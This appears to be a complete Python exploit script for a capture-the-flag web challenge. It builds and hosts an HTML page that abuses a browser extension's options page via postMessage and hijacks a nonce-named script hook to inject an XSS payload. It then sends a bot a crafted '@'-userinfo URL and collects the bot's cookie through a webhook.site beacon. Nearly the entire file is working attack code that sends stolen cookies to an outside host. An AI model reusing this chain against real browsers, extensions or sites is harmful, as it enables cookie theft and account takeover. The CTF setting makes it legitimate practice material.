#!/usr/bin/env python3
import io
import json
import time
from urllib.parse import urljoin, urlsplit

import requests


TARGET = "https://perchance-db1eb9fdc7d0.chall.nnsc.tf/perchance"
BUGSMASH_API = "https://api.bugsmash.io/api/v2"
BUGSMASH_EXT = "moz-extension://09a6c422-a354-447d-b4ea-185cb10be869/options.html"
DOCS_ACTIVATE = "https://doc.rust-lang.org"
DOCS_PAGE = "https://doc.rust-lang.org/stable/std/"
WEBHOOK_API = "https://webhook.site"


def create_webhook_token(session: requests.Session) -> str:
    r = session.post(f"{WEBHOOK_API}/token", timeout=30)
    r.raise_for_status()
    token = r.json()["uuid"]
    print(f"[+] webhook token: {token}")
    return token


def build_drop_html(webhook_token: str) -> str:
    beacon_url = f"https://webhook.site/{webhook_token}"
    payload = (
        "<img src=x onerror='navigator.sendBeacon("
        + json.dumps(beacon_url)
        + ",document.cookie)'>"
    )
    return f"""<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>perchance bridge</title>
    <style>
      html, body {{
        margin: 0;
        width: 100%;
        height: 100%;
        background: #111;
        color: #eee;
        font: 16px/1.4 sans-serif;
      }}
      #status {{
        position: fixed;
        inset: 16px auto auto 16px;
        z-index: 2;
      }}
      iframe {{
        width: 1px;
        height: 1px;
        border: 0;
        position: absolute;
        left: -9999px;
        top: -9999px;
      }}
    </style>
  </head>
  <body>
    <div id="status">loading</div>
    <iframe id="opt" src="{BUGSMASH_EXT}"></iframe>
    <script>
      const DOCS_ACTIVATE = {json.dumps(DOCS_ACTIVATE)};
      const DOCS_PAGE = {json.dumps(DOCS_PAGE)};
      const PAYLOAD = {json.dumps(payload)};
      const BEACON = {json.dumps(beacon_url)};
      const status = document.getElementById('status');
      const opt = document.getElementById('opt');
      function report(stage) {{
        try {{ navigator.sendBeacon(BEACON, stage + '|' + location.href); }} catch (e) {{}}
      }}
      report('page');
      let armed = false;
      let redirected = false;
      const targets = [opt.contentWindow];

      function postActivate(url) {{
        for (const target of targets) {{
          try {{
            target.postMessage(url, '*');
          }} catch (e) {{}}
        }}
      }}

      function armNonceHook() {{
        if (armed) return;
        armed = true;
        const seen = new Set();
        const obs = new MutationObserver(() => {{
          for (const s of document.querySelectorAll('script')) {{
            const txt = s.textContent || '';
            const m = txt.match(/window\\['([a-f0-9]+)'\\]=/);
            if (!m) continue;
            const nonce = m[1];
            if (seen.has(nonce)) continue;
            seen.add(nonce);
            Object.defineProperty(window, nonce, {{
              configurable: true,
              get() {{
                report('getter');
                sessionStorage.setItem('gotNonce', '1');
                return () => PAYLOAD;
              }},
              set(_) {{}}
            }});
            report('nonce');
            status.textContent = 'nonce armed';
          }}
        }});
        obs.observe(document.documentElement, {{childList: true, subtree: true}});
      }}

      armNonceHook();
      // Configure the attacker origin before the first document completion.
      const attackerConfig = location.origin + '/https://doc.rust-lang.org/';
      opt.addEventListener('load', () => {{
        report('options');
        postActivate(attackerConfig);
      }});
      postActivate(attackerConfig);
      const t1 = setInterval(() => postActivate(attackerConfig), 25);
      setTimeout(() => clearInterval(t1), 5000);

      const t2 = setInterval(() => {{
        if (sessionStorage.getItem('gotNonce') !== '1' || redirected) return;
        clearInterval(t2);
        redirected = true;
        status.textContent = 'returning to docs';
        const t3 = setInterval(() => postActivate(DOCS_ACTIVATE), 25);
        setTimeout(() => {{
          clearInterval(t3);
          location.href = DOCS_PAGE;
        }}, 2500);
      }}, 100);

      // Trigger a clean URL in a child frame. The navigation event contains
      // the attacker origin and docs marker, while the tab-level injection
      // remains visible to the hook in the top-level page.
      setTimeout(() => {{
        if (sessionStorage.getItem('gotNonce') !== '1' && !redirected) {{
          report('probe');
          const probe = document.createElement('iframe');
          probe.src = location.origin + '/clean/https://doc.rust-lang.org/';
          probe.hidden = true;
          document.body.appendChild(probe);
        }}
      }}, 5000);
    </script>
  </body>
</html>
"""


def upload_drop(session: requests.Session, html: str) -> dict:
    files = {
        "html": ("index.html", io.BytesIO(html.encode()), "text/html"),
        "entry_file": (None, "index.html"),
        "source": (None, "marketing"),
    }
    r = session.post(f"{BUGSMASH_API}/drop", files=files, timeout=60)
    r.raise_for_status()
    data = r.json()
    status = data.get("status", "")
    print(f"[+] bugsmash status: {status}")
    print(f"[+] bugsmash hosted url: {data.get('hosted_url')}")
    return data


def wait_for_live(session: requests.Session, data: dict) -> dict:
    status_url = data.get("status_url") or data.get("data", {}).get("status_url")
    if not status_url:
        return data
    status_url = urljoin(f"{BUGSMASH_API}/", status_url)
    current = data
    for _ in range(120):
        state = str(current.get("status", "")).lower()
        if state in {"live", "claimed"} or (not state and current.get("hosted_url")):
            return current
        if state in {"failed", "expired", "expiring", "flagged", "removed"}:
            raise RuntimeError(f"bugsmash deploy failed: {state}")
        time.sleep(1)
        r = session.get(status_url, timeout=30)
        r.raise_for_status()
        current = {**data, **r.json()}
    raise TimeoutError("bugsmash deploy did not finish in time")


def trigger_bot(session: requests.Session, hosted_url: str) -> None:
    parsed = urlsplit(hosted_url)
    target = f"https://doc.rust-lang.org@{parsed.netloc}/https://doc.rust-lang.org/"
    print(f"[+] bot target: {target}")
    r = session.post(TARGET, files={"perchance": (None, target)}, timeout=60)
    r.raise_for_status()
    print("[+] challenge accepted the URL")


def poll_webhook(session: requests.Session, token: str, timeout_s: int = 150):
    api = f"{WEBHOOK_API}/token/{token}/requests?per_page=50"
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        r = session.get(api, timeout=30)
        r.raise_for_status()
        events = r.json().get("data", [])
        if events:
            return events
        time.sleep(2)
    raise TimeoutError("no webhook request observed")


def main() -> int:
    session = requests.Session()

    webhook_token = create_webhook_token(session)
    html = build_drop_html(webhook_token)
    drop = wait_for_live(session, upload_drop(session, html))
    hosted_url = drop.get("hosted_url")
    if not hosted_url:
        raise RuntimeError("bugsmash did not return a hosted URL")

    trigger_bot(session, hosted_url)

    print("[+] polling webhook for the cookie")
    events = poll_webhook(session, webhook_token)
    for idx, event in enumerate(events, 1):
        print(f"\n--- request {idx} ---")
        print(json.dumps(event, indent=2, sort_keys=True))

    flag = None
    for event in events:
        for key in ("content", "raw_content"):
            body = event.get(key)
            if isinstance(body, str) and "NNS{" in body:
                flag = body.strip()
                break
        if flag:
            break

    if flag:
        print(f"\n[+] flag candidate: {flag}")
    else:
        print("\n[-] webhook request arrived, but the flag was not obvious")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
